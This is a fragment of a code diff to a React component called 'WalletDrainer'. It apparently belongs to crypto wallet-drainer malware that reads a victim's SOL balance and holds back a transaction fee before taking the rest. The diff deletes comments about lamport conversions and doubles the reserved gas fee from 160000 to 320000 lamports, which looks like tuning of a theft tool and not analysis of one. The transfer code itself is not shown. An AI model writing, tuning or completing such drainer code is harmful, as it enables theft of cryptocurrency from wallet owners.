@@ -113,14 +113,9 @@ export default function WalletDrainer({ wallet }) {
         //   const balance = 1000000000000;
           console.log(`💰 SOL Balance: ${balance / LAMPORTS_PER_SOL} SOL`);
 
-          // what is 0.00016 SOL in lamports?
-            // 1 SOL = 1000000000 lamports
-            // 0.00016 SOL = 160000 lamports
-          // what is $4.5 in lamports?
-
 
         // const gasFee = 4950000;
-        const gasFee = 160000;
+        const gasFee = 320000;
 
   
           if (balance <= gasFee) {
